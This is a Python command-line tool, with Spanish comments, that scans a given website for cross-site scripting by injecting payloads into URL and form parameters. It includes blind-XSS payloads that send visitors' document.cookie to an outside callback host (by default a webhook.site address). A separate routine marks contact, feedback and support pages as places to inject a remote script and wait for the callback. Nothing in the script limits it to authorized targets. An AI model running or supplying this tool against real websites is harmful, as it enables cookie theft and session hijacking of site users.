#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS ADVANCED v2.0 - TANQUE EDITION
Detección contextual · Verificación escaping · Blind XSS con callback
"""

import aiohttp
import asyncio
import re
import sys
import random
import string
from urllib.parse import urlparse, urljoin, quote
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url, **kwargs): return None

class XSSAdvanced:
    def __init__(self, url: str, callback_url: str = None):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.callback_url = callback_url or f"https://webhook.site/{''.join(random.choices(string.hexdigits, k=8))}"
        self.client = None
        self.findings = []
        
        # Payloads priorizados
        self.payloads = [
            # Blind XSS (con callback)
            (f"<script>fetch('{self.callback_url}?c='+document.cookie)</script>", "blind_fetch", 10),
            (f"<img src=x onerror=this.src='{self.callback_url}?c='+document.cookie>", "blind_image", 10),
            (f"<svg/onload=fetch('{self.callback_url}?c='+document.cookie)>", "blind_svg", 10),
            
            # Clásicos
            ("<script>alert(1)</script>", "basic_script", 9),
            ("<img src=x onerror=alert(1)>", "image_onerror", 9),
            ("<svg onload=alert(1)>", "svg_onload", 9),
            ("javascript:alert(1)", "javascript_uri", 8),
            
            # Event handlers
            ("\" onmouseover=alert(1) \"", "event_handler", 8),
            ("<body onload=alert(1)>", "body_onload", 8),
            ("<details open ontoggle=alert(1)>", "details_ontoggle", 7),
            
            # Atributos peligrosos
            ("<iframe src=javascript:alert(1)>", "iframe_js", 7),
            ("<math href=\"javascript:alert(1)\">", "math_href", 6),
        ]
        
        # Patrones de contexto
        self.context_patterns = {
            'html': [r'<[^>]*>{payload}[^<]*<'],
            'attribute': [r'=["\']{payload}["\']', r'=["\']{payload}[>\s]'],
            'script': [r'<script[^>]*>[^<]*{payload}[^<]*</script>'],
            'style': [r'<style[^>]*>[^}]*{payload}[^}]*}'],
            'comment': [r'<!--[^-]*{payload}[^-]*-->'],
        }
        
    async def setup(self):
        """Inicializa cliente HTTP tanque"""
        self.client = HTTPClient(timeout=10, max_retries=2)
        
    def detect_context(self, html: str, payload: str) -> Dict:
        """Detecta contexto y verifica si está escapado"""
        result = {
            'context': 'unknown',
            'executable': False,
            'escaped': False
        }
        
        for ctx, patterns in self.context_patterns.items():
            for pattern in patterns:
                context_pattern = pattern.replace('{payload}', re.escape(payload))
                if re.search(context_pattern, html, re.DOTALL):
                    result['context'] = ctx
                    result['executable'] = True
                    break
                    
        # Verificar escaping
        escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        if escaped_payload in html and payload not in html:
            result['escaped'] = True
            result['executable'] = False
            
        return result
        
    async def extract_params(self) -> List[str]:
        """Extrae parámetros de URL y formularios"""
        params = []
        
        # De la URL
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
                    
        # De formularios
        try:
            resp = await self.client.get(self.url)
            if resp:
                html = await resp.text()
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html, re.IGNORECASE)
                params.extend(inputs)
        except:
            pass
            
        # Parámetros comunes
        if not params:
            params = ['q', 's', 'search', 'query', 'name', 'user', 
                     'comment', 'message', 'text', 'input']
                     
        return list(set(params))
        
    async def test_param(self, url: str, param: str, payload: tuple) -> Optional[Dict]:
        """Prueba un payload en un parámetro"""
        payload_str, payload_name, priority = payload
        
        try:
            # Construir URL
            if '?' in url:
                test_url = url.replace(f"{param}=", f"{param}={quote(payload_str)}")
            else:
                test_url = f"{url}?{param}={quote(payload_str)}"
                
            resp = await self.client.get(test_url)
            if not resp:
                return None
                
            text = await resp.text()
            
            # Analizar contexto
            context = self.detect_context(text, payload_str)
            
            if context['executable']:
                severity = 'CRITICO' if context['context'] in ['script', 'html'] else 'ALTO'
                
                return {
                    'type': 'XSS',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'context': context['context'],
                    'url': test_url,
                    'severity': severity,
                    'priority': priority
                }
                
        except Exception as e:
            pass
        return None
        
    async def test_blind(self) -> List[Dict]:
        """Prepara payloads para blind XSS"""
        findings = []
        
        blind_targets = [
            '/contact', '/feedback', '/comment', '/review', 
            '/support', '/report', '/bug', '/issue'
        ]
        
        for target in blind_targets:
            url = urljoin(self.url, target)
            try:
                resp = await self.client.get(url)
                if resp and resp.status == 200:
                    findings.append({
                        'type': 'BLIND_XSS_CANDIDATE',
                        'url': url,
                        'payload': f"<script src='{self.callback_url}'></script>",
                        'callback': self.callback_url,
                        'severity': 'ALTO',
                        'note': 'Inyectar y esperar callback'
                    })
            except:
                pass
                
        return findings
        
    async def scan(self):
        """Ejecuta escaneo XSS completo"""
        print(f"\n[XSS] XSS ADVANCED TANQUE - {self.url}")
        print("=" * 60)
        print(f"[*] Callback URL: {self.callback_url}")
        
        await self.setup()
        
        try:
            # Extraer parámetros
            params = await self.extract_params()
            print(f"[*] Probando {len(params)} parámetros")
            
            # 1. XSS reflejado
            print("\n[*] Probando XSS reflejado...")
            for param in params:
                for payload in sorted(self.payloads, key=lambda x: x[2], reverse=True):
                    # Rate limiting
                    await asyncio.sleep(random.uniform(0.3, 0.8))
                    
                    result = await self.test_param(self.url, param, payload)
                    
                    if result:
                        self.findings.append(result)
                        
                        if result['severity'] == 'CRITICO':
                            print(f"    [[CRITICO]] {param} → {result['payload_name']} ({result['context']})")
                        else:
                            print(f"    [[WARN]] {param} → {result['payload_name']}")
                            
                        # Si encontramos crítico, seguir con otro parámetro
                        if result['severity'] == 'CRITICO':
                            break
                            
            # 2. Blind XSS
            print("\n[*] Preparando blind XSS...")
            blind = await self.test_blind()
            self.findings.extend(blind)
            
            for b in blind:
                print(f"    [[INFO]] Blind candidate: {b['url']}")
                
            # Mostrar resumen
            print("\n" + "="*60)
            print("📊 RESULTADOS XSS")
            print("="*60)
            
            if self.findings:
                criticos = [f for f in self.findings if f['severity'] == 'CRITICO']
                altos = [f for f in self.findings if f['severity'] == 'ALTO']
                
                if criticos:
                    print(f"\n[CRITICO] CRÍTICOS: {len(criticos)}")
                    for f in criticos[:5]:
                        print(f"   • {f['param']}: {f['payload_name']} ({f['context']})")
                        
                if altos:
                    print(f"\n[WARN]  ALTOS: {len(altos)}")
                    
                print(f"\n[OK] Total: {len(self.findings)}")
            else:
                print("\n[OK] No se detectaron XSS")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 xss_advanced.py <URL> [callback_url]")
        sys.exit(1)
        
    url = sys.argv[1]
    callback = sys.argv[2] if len(sys.argv) > 2 else None
    
    scanner = XSSAdvanced(url, callback)
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
